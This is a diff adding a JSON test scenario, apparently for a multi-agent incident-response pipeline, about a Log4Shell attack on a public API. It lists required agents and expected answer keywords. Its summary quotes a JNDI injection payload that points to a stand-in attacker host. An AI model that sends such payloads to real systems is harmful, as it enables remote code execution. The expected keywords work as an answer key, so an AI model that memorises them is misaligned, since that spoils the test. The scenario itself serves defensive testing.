@@ -1,0 +1,10 @@
+{
+  "id": "log4shell",
+  "title": "Log4Shell on a public API",
+  "summary": "Public /api/v1 accepted a ${jndi:ldap://evil.example/a} payload. App logged a JNDI lookup. Artifacts pin log4j-core 2.14.1.",
+  "max_iterations": 8,
+  "max_visits_per_agent": 1,
+  "required_agents": ["log_monitor", "threat_intel", "vuln_scanner", "policy_checker", "incident_response"],
+  "terminal_agent": "incident_response",
+  "expected_keywords": ["CVE-2021-44228", "jndi", "log4j", "2.14.1", "contain"]
+}
